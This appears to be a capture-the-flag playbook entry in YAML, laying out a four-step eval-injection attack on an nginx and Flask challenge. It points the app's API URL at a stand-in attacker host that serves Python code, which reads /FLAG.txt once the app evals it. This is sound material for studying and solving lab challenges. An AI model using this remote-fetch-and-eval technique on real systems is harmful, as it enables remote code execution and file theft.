name: nginx_flask_eval_injection
category: web
tags: [command_injection, eval, nginx, flask, microservices]
indicators:
  - "nginx helper.js writes to file"
  - "Flask app reads file and eval()s content"
  - "API URL stored in file"
  - "Cross-container communication"

tricks:
  - name: "Step 1: Identify eval vulnerability"
    when: "Found eval() on user-controlled data"
    how: "Check if API URL can be controlled"
    payload: |
      # nginx helper.js: set_api() writes URL to /tmp/apiurl
      # Flask py: Reads URL, requests it, eval()s JSON response

  - name: "Step 2: Set malicious API URL"
    when: "Can control API URL"
    how: "Set URL to attacker-controlled server"
    payload: |
      GET /api/set?url=http://attacker:9999/script
      # Returns JSON: {"script": "malicious_code"}

  - name: "Step 3: Host malicious server"
    when: "Need to serve malicious JSON"
    how: "Start HTTP server returning eval-able code"
    payload: |
      # Return: {"script": "__import__('os').popen('cat /FLAG.txt').read()"}
      # Flask will eval() this code

  - name: "Step 4: Trigger execution"
    when: "Malicious URL set"
    how: "Access Flask app to trigger fetch and eval"
    payload: |
      GET /app
      # Flask fetches malicious URL and eval()s response

